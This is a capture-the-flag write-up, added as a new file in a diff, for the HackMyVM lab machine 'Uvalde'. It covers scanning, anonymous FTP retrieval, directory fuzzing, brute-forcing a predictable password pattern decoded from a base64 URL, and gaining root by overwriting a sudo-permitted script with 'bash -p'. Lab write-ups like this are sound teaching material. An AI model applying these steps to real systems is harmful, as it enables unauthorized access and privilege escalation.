@@ -1,0 +1,209 @@
+---
+title: Uvalde
+date: '2025-06-22'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - FTP
+  - LINUX
+cover: /mc/uploads/2025/06/ez.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hello today we gonna try to hack an old machine "[**Uvalde**](https://hackmyvm.eu/machines/machine.php?vm=Uvalde)" in **[HackmyVM](https://hackmyvm.eu/)** so lets start with Recon
+
+```bash
+ζ nmap -sV -sC 192.168.138.105 -T5 -A
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 09:23 EDT
+Nmap scan report for 192.168.138.105
+Host is up (0.00066s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
+| ftp-syst:
+| STAT:
+| FTP server status:
+| Connected to ::ffff:192.168.138.102
+| Logged in as ftp
+| TYPE: ASCII
+| No session bandwidth limit
+| Session timeout in seconds is 300
+| Control connection is plain text
+| Data connections will be plain text
+| At session startup, client count was 2
+| vsFTPd 3.0.3 - secure, fast, stable
+|End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |-rw-r--r-- 1 1000 1000 5154 Jan 28 2023 output
+22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+| 3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
+| 256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
+|_ 256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
+80/tcp open http Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Agency - Start Bootstrap Theme
+MAC Address: 08:00:27:CC:46:4C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+so we have the ftp port open and the port 80
+
+first we gonna get the the file "output" anounymously and with this command
+
+## FTP 
+
+```bash
+curl ftp://192.168.138.105:21/output -o output
+```
+we gonna read the file :
+
+```bash
+ζ cat output
+
+Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
+matthew@debian:~$ id
+uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
+matthew@debian:~$ ls -al
+total 32
+drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
+drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
+lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
+-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
+-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
+drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
+drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
+-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
+-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
+-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
+matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
+                                                                                
+ ▄▄                            ▄▄                                               
+ ██                            ██                                               
+ ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
+ ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
+ ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
+ ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
+ ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
+                                                    ███                         
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+            ▄████▄   ██    ██                                                   
+           ██▄▄▄▄██  ██    ██                                                   
+           ██▀▀▀▀▀▀  ██    ██                                                   
+    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                   
+    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
+                                                                                
+                                                                                
+matthew@debian:~$ exit
+exit
+
+Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
+```
+
+```bash
+matthew@debian:~$ id
+uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
+```
+so we got an username "matthew"
+
+## Directory Fuzzing
+
+after that we gonna interact with the website by Discovering the endpoints .
+
+```bash
+ζ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.138.105 -x php,html,txt,js
+
+/index.php (Status: 200) [Size: 29604]
+/img (Status: 301) [Size: 316] [--> http://192.168.138.105/img/]
+/login.php (Status: 200) [Size: 1022]
+/user.php (Status: 302) [Size: 0] [--> login.php]
+/mail (Status: 301) [Size: 317] [--> http://192.168.138.105/mail/]
+/css (Status: 301) [Size: 316] [--> http://192.168.138.105/css/]
+/js (Status: 301) [Size: 315] [--> http://192.168.138.105/js/]
+/success.php (Status: 302) [Size: 0] [--> login.php]
+/vendor (Status: 301) [Size: 319] [--> http://192.168.138.105/vendor/]
+/create_account.php (Status: 200) [Size: 1003]
+```
+so we got these endpointsi tried SQLi on the login form but its doenst work so i tried to create a new account
+
+"hunter" but the weird things is there is no password input , so if they gonna give us the password ,that is a good thing to see how they struct their password so maybe that can lead us to know the password of matthew
+
+after creating a password they redirect us to :
+
+### Token Analyse
+
+```bash
+http://192.168.138.105/success.php?dXNlcm5hbWU9aHVudGVyJnBhc3N3b3JkPWh1bnRlcjIwMjVAMjU0MQ==
+```
+so the parameter after the success.php is encrypt it to base64 so with burpsuite we can decrypt it .
+
+[![](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-22-152723.png)](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-22-152723.png)so the url become like this /success.php?username=hunter&password=hunter2025@2541   
+ ,i tried with many account like test2 test3
+
+/success.php?username=test1&password=test12025@3284  
+/success.php?username=test2&password=test22025@7694
+
+we see that the password has a form : "username"+"2025"@"4 digits"
+
+ I tried to brute force the password of matthew but nothing appears all the status code are 200
+
+## Initial Access
+
+i was thinking what if the 2025 is the year when the account is created so i tried to change it to 2023 when the first release of the Machine . and it works we got the credentials :
+
+[![intruder to find the password of matthew](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-22-160647.png)](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-22-160647.png)**matthew:matthew2023@1554**
+
+while creating accounts i see that there is the Admin account already exist i treid to do the same thing with it and it got the password but the redirect page i got is the same as i got it with matthew so there is no difference so i tried to authenticate with ssh
+
+```bash
+ssh matthew@192.168.138.105
+and we got the user flag
+matthew@uvalde:~$ ls
+user.txt
+```
+## Priv Esclation
+
+lets see the permission that matthew has :
+
+```bash
+matthew@uvalde:~$ sudo -l
+Matching Defaults entries for matthew on uvalde:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User matthew may run the following commands on uvalde:
+(ALL : ALL) NOPASSWD: /bin/bash /opt/superhack *
+```
+we got the binary . so i analyse it and it doesnt nothing , i try to see if there is a command injection but noo so what we gonna do is hijack the system
+
+so we gonna rename the the binary
+
+```bash
+mv superhack old
+echo "bash -p" >superhack
+```
+after that execute it
+
+```bash
+matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack *
+root@uvalde:/opt# whoami
+root
+```
+**Rooted**
+
+## Note
+
+why this is working even we dont have the permission to rename the binary in fact we have the permission write on the entire directory
+
+```bash
+matthew@uvalde:/opt$ ls -ld .
+drwx---rwx 2 root root 4096 Jun 22 17:48 .
+```
